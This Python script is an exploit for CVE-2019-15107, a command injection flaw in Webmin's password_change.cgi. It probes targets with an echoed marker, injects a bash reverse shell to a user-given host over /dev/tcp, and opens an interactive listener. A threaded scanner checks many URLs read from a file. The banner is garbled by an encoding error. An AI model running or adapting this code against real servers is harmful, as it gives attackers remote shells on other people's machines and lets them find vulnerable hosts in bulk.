#£¨´ýÐÞ¸Ä£©
#!/bin/python3

import select
import socket
import argparse
import threading
import subprocess
from rich.console import Console
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed

def ascii_art():
    print("")
    color.print("[bold bright_green] ¨€¨€¨€¨€¨€¨€¨[¨€¨€¨[   ¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[    ¨€¨€¨€¨€¨€¨€¨[  ¨€¨€¨€¨€¨€¨€¨[  ¨€¨€¨[ ¨€¨€¨€¨€¨€¨[        ¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[ ¨€¨€¨[ ¨€¨€¨€¨€¨€¨€¨[ ¨€¨€¨€¨€¨€¨€¨€¨[[/bold bright_green]")
    color.print("[bold bright_green]¨€¨€¨X¨T¨T¨T¨T¨a¨€¨€¨U   ¨€¨€¨U¨€¨€¨X¨T¨T¨T¨T¨a    ¨^¨T¨T¨T¨T¨€¨€¨[¨€¨€¨X¨T¨€¨€¨€¨€¨[¨€¨€¨€¨U¨€¨€¨X¨T¨T¨€¨€¨[      ¨€¨€¨€¨U¨€¨€¨X¨T¨T¨T¨T¨a¨€¨€¨€¨U¨€¨€¨X¨T¨€¨€¨€¨€¨[¨^¨T¨T¨T¨T¨€¨€¨U[/bold bright_green]")
    color.print("[bold bright_green]¨€¨€¨U     ¨€¨€¨U   ¨€¨€¨U¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨[ ¨€¨€¨€¨€¨€¨X¨a¨€¨€¨U¨€¨€¨X¨€¨€¨U¨^¨€¨€¨U¨^¨€¨€¨€¨€¨€¨€¨U¨€¨€¨€¨€¨€¨[¨^¨€¨€¨U¨€¨€¨€¨€¨€¨€¨€¨[¨^¨€¨€¨U¨€¨€¨U¨€¨€¨X¨€¨€¨U    ¨€¨€¨X¨a[/bold bright_green]")
    color.print("[bold bright_green]¨€¨€¨U     ¨^¨€¨€¨[ ¨€¨€¨X¨a¨€¨€¨X¨T¨T¨a¨^¨T¨T¨T¨T¨a¨€¨€¨X¨T¨T¨T¨a ¨€¨€¨€¨€¨X¨a¨€¨€¨U ¨€¨€¨U ¨^¨T¨T¨T¨€¨€¨U¨^¨T¨T¨T¨T¨a ¨€¨€¨U¨^¨T¨T¨T¨T¨€¨€¨U ¨€¨€¨U¨€¨€¨€¨€¨X¨a¨€¨€¨U   ¨€¨€¨X¨a[/bold bright_green]")
    color.print("[bold bright_green]¨^¨€¨€¨€¨€¨€¨€¨[ ¨^¨€¨€¨€¨€¨X¨a ¨€¨€¨€¨€¨€¨€¨€¨[    ¨€¨€¨€¨€¨€¨€¨€¨[¨^¨€¨€¨€¨€¨€¨€¨X¨a ¨€¨€¨U ¨€¨€¨€¨€¨€¨X¨a       ¨€¨€¨U¨€¨€¨€¨€¨€¨€¨€¨U ¨€¨€¨U¨^¨€¨€¨€¨€¨€¨€¨X¨a   ¨€¨€¨U[/bold bright_green]")
    color.print("[bold bright_green] ¨^¨T¨T¨T¨T¨T¨a  ¨^¨T¨T¨T¨a  ¨^¨T¨T¨T¨T¨T¨T¨a    ¨^¨T¨T¨T¨T¨T¨T¨a ¨^¨T¨T¨T¨T¨T¨a  ¨^¨T¨a ¨^¨T¨T¨T¨T¨a        ¨^¨T¨a¨^¨T¨T¨T¨T¨T¨T¨a ¨^¨T¨a ¨^¨T¨T¨T¨T¨T¨a    ¨^¨T¨a[/bold bright_green]")
    print("")
    print("------ Coded By K3ysTr0K3R and Chocapikk (We make exploits, lulz) ------")
    print("")

color = Console()

vuln_path = "/password_change.cgi"


def check_vuln_response(target):
    test_vuln = (
        f"curl --connect-timeout 5 -sk -X POST '{target}:10000{vuln_path}' "
        "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
        f"-H 'Referer: {target}:10000/' "
        "-H 'Content-Type: application/x-www-form-urlencoded' "
        "-d 'expired=echo%20iJCHlHgMNOcxKwMIjhKXUYEaZMKM&new1=iJCHlHgMNOcxKwMIjhKXUYEaZMKM&new2=iJCHlHgMNOcxKwMIjhKXUYEaZMKM&old=echo%20iJCHlHgMNOcxKwMIjhKXUYEaZMKM'"
    )
    try:
        send_test = subprocess.run(
            test_vuln, shell=True, capture_output=True, text=True
        )
        return send_test.stdout
    except Exception:
        pass


def exploit(target, lhost, lport):
    exploit_target = (
        f"curl -sk -X POST '{target}:10000{vuln_path}' "
        "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
        f"-H 'Referer: {target}:10000/' "
        "-H 'Content-Type: application/x-www-form-urlencoded' "
        f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
    )
    exploit_target = subprocess.run(
        exploit_target, shell=True, capture_output=True, text=True
    )
    return exploit_target.stdout


def detect_CVE_2019_15107(target, lhost, lport):
    color.print("[blue][*][/blue] Checking if the target is vulnerable")
    vuln_response = check_vuln_response(target)
    if "iJCHlHgMNOcxKwMIjhKXUYEaZMKM" in vuln_response:
        color.print("[green][+][/green] Target is vulnerable")
        color.print(
            f"[blue][*][/blue] Launching exploit against: [cyan]{target}[/cyan]"
        )
        color.print(
            f"[blue][*][/blue] Sending payload: [yellow]bash -c[/yellow] '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'"
        )
        exploit_thread = threading.Thread(target=exploit, args=(target, lhost, lport))
        listen_thread = threading.Thread(target=start_listener, args=(lhost, lport))
        exploit_thread.start()
        listen_thread.start()
        exploit_thread.join()
    else:
        color.print("[red][~][/red] Target is not vulnerable")
        exit()


def start_listener(lhost, lport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", 4444))
        server_socket.listen(1)
        color.print(f"[blue][*][/blue] Listening on {lhost}:{lport}")

        client_socket, addr = server_socket.accept()
        color.print(f"[green][+][/green] Connection received from {addr[0]}:{addr[1]}")

        client_socket.setblocking(0)
        color.print("[blue][*][/blue] Command shell opened")

        while True:
            command = input("# ").strip()
            if command:
                client_socket.send(command.encode() + b"\n")

            ready = select.select([client_socket], [], [], 0.5)
            if ready[0]:
                response = client_socket.recv(4096)
                print(response.decode(errors="replace").strip())
    except KeyboardInterrupt:
        color.print("[red][!][/red] Keyboard Interrupt received, closing socket.")
    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()


def CVE_2019_15107_scanner(target):
    if "iJCHlHgMNOcxKwMIjhKXUYEaZMKM" in check_vuln_response(target):
        color.print(
            f"[green][+][/green] [cyan]{target}:10000[/cyan] - is vulnerable to [green]CVE-2019-15107[/green]"
        )


def scan_from_file(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file]
        if not urls:
            return

        completed_tasks = []
        failed_tasks = []

        with alive_bar(
            len(urls), title="Scanning Targets", bar="classic", enrich_print=False
        ) as bar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_url = {
                    executor.submit(CVE_2019_15107_scanner, url): url for url in urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                        completed_tasks.append(url)
                    except Exception:
                        failed_tasks.append((url))
                    bar()


def main():
    ascii_art()
    parser = argparse.ArgumentParser(description="A PoC exploit for CVE-2019-15107 - Webmin Remote Code Execution")
    parser.add_argument("--url", help="Target URL to exploit")
    parser.add_argument("--lhost", help="Local host for reverse shell")
    parser.add_argument("--lport", help="Local port for reverse shell")
    parser.add_argument("--file", help="File containing URLs for scanning")
    parser.add_argument("--threads",help="The amount of threads you desire to increase the speed of the scanner")

    args = parser.parse_args()

    match args:
        case args if args.file:
            scan_from_file(args.file, int(args.threads or 1))
        case args if args.url and args.lhost and args.lport:
            detect_CVE_2019_15107(args.url, args.lhost, args.lport)
        case _:
            parser.print_help()


if __name__ == "__main__":
    main()